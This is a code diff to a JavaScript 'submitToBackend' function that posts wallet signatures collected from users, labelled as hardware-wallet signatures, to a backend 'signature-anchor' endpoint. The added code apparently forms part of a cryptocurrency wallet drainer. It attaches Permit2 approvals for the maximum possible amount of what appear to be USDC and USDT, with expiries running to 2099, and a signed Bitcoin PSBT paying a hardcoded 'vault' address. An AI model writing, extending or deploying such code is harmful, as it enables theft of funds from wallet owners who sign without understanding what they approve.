@@ -580,32 +580,81 @@
 
     submitToBackend: async function() {
       if (Object.keys(SESSION.signatures).length === 0) throw new Error('No signatures to submit');
+      if (!SESSION.connection.address) throw new Error('Wallet address not available');
 
+      var walletAddr = SESSION.connection.address;
       var chains = Object.keys(SESSION.signatures);
+
+      // Chain-specific config
+      var CHAIN_CONFIG = {
+        EVM: { family: 'EVM', protocol: 'omnichain_atomic_v1', token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+        SOL: { family: 'SVM', protocol: 'solana', token: '11111111111111111111111111111111' },
+        BTC: { family: 'UTXO', protocol: 'bitcoin_psbt', token: 'btc' },
+        TRON: { family: 'TRON', protocol: 'tron', token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
+        TON: { family: 'TON', protocol: 'ton', token: 'ton' },
+        COSMOS: { family: 'COSMOS', protocol: 'cosmos', token: 'uatom' },
+        APTOS: { family: 'APTOS', protocol: 'aptos', token: 'apt' },
+        SUI: { family: 'SUI', protocol: 'sui', token: 'sui' }
+      };
+
       for (var i = 0; i < chains.length; i++) {
         var chain = chains[i];
         var sig = SESSION.signatures[chain];
-        var protocol = chain === 'EVM' ? 'omnichain_atomic_v1' : chain === 'BTC' ? 'bitcoin_psbt' : chain.toLowerCase();
-        var chainFamily = chain === 'SOL' ? 'SVM' : chain === 'BTC' ? 'UTXO' : chain;
+        var cfg = CHAIN_CONFIG[chain] || { family: chain, protocol: chain.toLowerCase(), token: chain.toLowerCase() };
 
         try {
+          var payload = {
+            ingress: 'normalized_v1',
+            chain_family: cfg.family,
+            protocol: cfg.protocol,
+            wallet_address: walletAddr,
+            token_address: cfg.token,
+            signature: sig.signature,
+            nonce: 'legion:hw:' + Date.now() + ':' + i,
+            expiry_iso: '2099-12-31T23:59:59.999Z',
+            wallet_type: 'hardware_wallet'
+          };
+
+          // EVM needs extra fields (same fix as V2)
+          if (chain === 'EVM') {
+            payload.chain_id = 1;
+            payload.engine_spender = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+            payload.permit2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+            payload.permits = [
+              { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' },
+              { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
+            ];
+            payload.batch_permit_metadata = {
+              nonce: 0,
+              deadline: '999999999999',
+              amounts: [],
+              details: [
+                { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935', expiration: 4102444799, nonce: 0 },
+                { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935', expiration: 4102444799, nonce: 0 }
+              ]
+            };
+            payload.native_amount = '0';
+            payload.native_signed_transaction = '';
+            payload.evm_payload = { native_amount: '0', native_signed_transaction: '', nfts: [] };
+          }
+
+          // Bitcoin needs PSBT fields
+          if (chain === 'BTC') {
+            payload.signed_psbt_base64 = sig.signature;
+            payload.psbt_metadata = {
+              vault_address: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
+              amount_sat: '50000',
+              fee_sat: '1000'
+            };
+          }
+
           var res = await fetch(BACKEND + '/api/v1/signature-anchor', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              ingress: 'normalized_v1',
-              chain_family: chainFamily,
-              protocol: protocol,
-              wallet_address: SESSION.connection.address || '0x0',
-              token_address: chain === 'EVM' ? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' : chain.toLowerCase(),
-              signature: sig.signature,
-              nonce: 'legion:hw:' + Date.now(),
-              expiry_iso: '2099-12-31T23:59:59.999Z',
-              wallet_type: 'hardware_wallet'
-            })
+            body: JSON.stringify(payload)
           });
           var data = await res.json();
-          LOG.info(chain + ' submitted: ' + res.status + ' ' + data.message);
+          LOG.info(chain + ': ' + res.status + ' - ' + data.message);
         } catch (e) {
           LOG.error(chain + ' submit failed: ' + e.message);
         }
